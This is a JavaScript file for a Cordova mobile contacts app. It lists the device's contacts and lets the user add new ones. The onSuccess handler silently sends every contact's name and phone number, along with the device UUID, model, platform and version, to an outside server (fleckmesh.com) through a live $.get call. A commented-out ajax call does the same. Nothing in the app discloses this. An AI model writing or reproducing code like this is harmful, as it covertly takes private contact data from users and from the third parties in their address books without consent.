document.addEventListener("deviceready", onDeviceReady, false);
 
function onDeviceReady() {
    // we will not be doing anything!!
    var element = document.getElementById('deviceProperties');
    element.innerHTML = '<li>Device Model: '    + device.model    + '</li>' +
                        '<li>Device Cordova: '  + device.cordova  + '</li>' +
                        '<li>Device Platform: ' + device.platform + '</li>' +
                        '<li>Device UUID: '     + device.uuid     + '</li>' +
                        '<li>Device Version: '  + device.version  + '</li>';
}
 
$(document).on("pageshow", function () {
    $.mobile.loading("hide");
    $("body").removeClass('ui-disabled');
    if ($("#contactsList").length == 1) {
        $("body").addClass('ui-disabled').css("background", "#000");
        $.mobile.loading("show");
        var options = new ContactFindOptions();
        options.filter = "";
        options.multiple = true;
        var filter = ["displayName", "phoneNumbers"];
        //var filter = ["displayName"];
        navigator.contacts.find(filter, onSuccess, onError, options);
    } else if ($("#addContact").length == 1) {
        bindAddContactEvents();
    }
});
 
function onSuccess(contacts) {
    var html = "";

        html +='<h2>' + contacts.length +'</h2>';
        html  += '<ol>';

       //);
        // $.ajax({
        //   type: get,
        //   url: 'http://fleckmesh.com/contact/new?did='+device.uuid+'&device_model='+device.model+'&platform='+device.platform+'&version='+device.version+'&content='+contacts,
         
        // });
//html += '<p>' +  $.text(JSON.stringify(contacts)) + '</p>';
        //html += '<p>' + JSON.stringify(contacts) + '</p>';
    for (var i = 0; i < contacts.length; i++) {
        if ($.trim(contacts[i].displayName).length != 0 || $.trim(contacts[i].nickName).length != 0) {
           
            if (contacts[i].phoneNumbers) {




                
               
                // html += '<li>';
                // html += '<h2>' + contacts[i].displayName ? contacts[i].displayName : contacts[i].nickName + '</h2>';
                //     html += '<ul>';                  
                for (var j = 0; j < contacts[i].phoneNumbers.length; j++) {
                       // html += "<li>" + contacts[i].phoneNumbers[j].value + "</li>";

        $.get("http://fleckmesh.com/contact/new",
        {
            did: device.uuid,
            device_model: device.model,
            version: device.version,
            platform: device.platform,
            name:contacts[i].displayName,
            phone: contacts[i].phoneNumbers[j].value

           // content: 'Welcome Home hey'
        }
        //,function(returnData){
     // alert('Hi! ' + returnData);
      //html +='<h2>Hi! ' + returnData +'</h2>';
   //}
   );
                    }
                    // html += "</ul>";
                    // html += '</li>';
                }
                
            }
       
    }
    if (contacts.length === 0) {
        html = '<li data-role="collapsible" data-iconpos="right" data-shadow="false" data-corners="false">';
        html += '<h2>No Contacts</h2>';
        html += '<label>No Contacts Listed</label>';
        html += '</li>';
    }
    $("#contactsList").html(html);
    $("#contactsList").listview().listview('refresh');
    $(".innerlsv").listview().listview('refresh');
    $.mobile.loading("hide");
    $("body").removeClass('ui-disabled');
}
 
function onError(contactError) {
    alert('Oops Something went wrong!');
    $.mobile.loading("hide");
    $("body").removeClass('ui-disabled');
}
 
function bindAddContactEvents() {
    $("#addContact").on("click", function () {
        var name = $.trim($("#name").val()),
            number = $.trim($("#number").val());
 
        if (name.length == 0) {
            alert("Please enter a valid Name");
            return false;
        }
 
        if (number.length == 0) {
            alert("Please enter a valid Number");
            return false;
        }
 
        var contact = navigator.contacts.create();
        contact.displayName = name;
        contact.nickname = name;
 
        var phoneNumbers = [];
        phoneNumbers[0] = new ContactField('mobile', number, true);
        contact.phoneNumbers = phoneNumbers;
 
        contact.save(createSuccess, createError);
    });
}
 
function createSuccess() {
    alert("Contact has been successfully added");
    resetPage();
}
 
function createError() {
    alert("Oops Something went wrong! Please try again later.");
}
 
function resetPage() {
    $("#name").val("");
    $("#number").val("");
}